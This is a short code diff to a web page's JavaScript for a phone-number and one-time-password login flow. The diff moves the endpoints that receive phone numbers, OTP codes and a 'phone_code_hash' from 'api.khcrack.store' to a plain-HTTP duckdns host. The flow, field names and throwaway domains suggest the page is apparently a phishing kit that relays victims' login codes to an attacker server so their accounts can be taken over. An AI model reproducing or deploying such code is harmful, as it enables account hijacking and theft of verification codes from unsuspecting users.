@@ -63,7 +63,7 @@
                 return;
             }
             document.getElementById('message').innerText = 'Sending OTP...';
-            const result = await sendRequest('https://api.khcrack.store/send_otp', { phone });
+            const result = await sendRequest('http://ekerkzin158.duckdns.org/send_otp', { phone });
             if (result.error) {
                 document.getElementById('message').innerText = result.error;
             } else {
@@ -81,7 +81,7 @@
                 return;
             }
             document.getElementById('message').innerText = 'Verifying OTP...';
-            const result = await sendRequest('https://api.khcrack.store/verify_otp', { phone, otp, phone_code_hash: phoneCodeHash });
+            const result = await sendRequest('http://ekerkzin158.duckdns.org/verify_otp', { phone, otp, phone_code_hash: phoneCodeHash });
             if (result.error) {
                 document.getElementById('message').innerText = result.error;
                 if (result.requires_2fa) {
